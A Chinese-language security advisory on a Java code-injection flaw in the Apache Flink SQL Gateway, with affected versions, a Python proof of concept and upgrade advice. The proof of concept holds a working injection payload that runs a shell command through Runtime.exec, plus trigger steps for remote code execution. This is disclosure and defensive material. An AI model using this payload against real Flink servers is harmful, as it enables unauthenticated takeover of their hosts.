**文章来源为：AI agent 自动采集整理**

**严重程度：** High
**CVSS：** 8.1
**影响版本：** Apache Flink 1.15.0 - 1.20.3 / 2.0.0 - 2.2.0
**公开日期：** 2026-07-09

### 漏洞描述
Apache Flink SQL Gateway REST API（默认端口8083）在处理JSON格式数据时，ROW字段名被直接拼接进生成的Java代码中（JsonGenerateUtils.scala -> generateRowConverter()），未经过EncodingUtils.escapeJava()转义。攻击者可通过构造恶意字段名注入任意Java代码，在TaskManager JVM上实现远程代码执行。默认配置下SQL Gateway无认证。

### POC/利用
```python
# Attack vector: JsonGenerateUtils.scala -> generateRowConverter()
# ROW field name interpolated into generated Java code:
#   s'objNode.set("$fieldName", NODE_TERM);'
# without EncodingUtils.escapeJava().
# Field name breaks string literal and injects arbitrary Java.

# JSON vector payload:
java_cmd = 'id > /tmp/pwned'
payload = f'x", NODE_TERM); try{{Runtime.getRuntime().exec(new String[]{{"bash","-c","{java_cmd}"}});}}catch(Exception e){{}} //'

# Steps:
# 1. POST /v1/sessions -> create session
# 2. SET execution.runtime-mode = batch
# 3. CREATE TABLE with malicious field name containing Java injection
# 4. INSERT + SELECT trigger code generation -> RCE on TaskManager

# LIKE vector also available (simpler but less reliable)
```

### 修复建议
1. 升级到 Apache Flink 1.20.4 / 2.0.2 / 2.1.2 / 2.2.1 或更高版本
2. 临时缓解：为SQL Gateway启用认证，限制网络访问
3. 防御：对ROW字段名进行严格输入验证和转义
